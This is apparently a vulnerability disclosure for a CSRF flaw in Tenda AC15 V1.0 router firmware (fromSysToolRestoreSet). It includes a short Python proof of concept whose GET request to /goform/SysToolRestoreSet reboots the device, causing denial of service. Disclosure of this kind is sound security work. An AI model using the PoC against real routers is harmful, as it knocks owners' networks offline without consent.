## Overview

- Firmware download website: https://www.tendacn.com/us/download/detail-3851.html

## Affected version

AC15V1.0 V15.03.20_multi

## Vulnerability details

The Tenda AC15V1.0 V15.03.20_multi has a Cross Site Request Forgery (CSRF) vulnerability located in the `fromSysToolRestoreSet` function. It allows remote attackers to reboot the device and cause denial of service.

![image-20240316182517935](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240316182517935.png)

![image-20240316182541889](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240316182541889.png)

## PoC

```python
import requests

url = "http://192.168.84.101/goform/SysToolRestoreSet"

headers = {
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Cookie': 'bLanguage=cn; user=; password=yhryhr',
    'Connection': 'close'
}

response = requests.get(url, headers=headers)
print(response.text)
```

![image-20240316182416080](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240316182416080.png)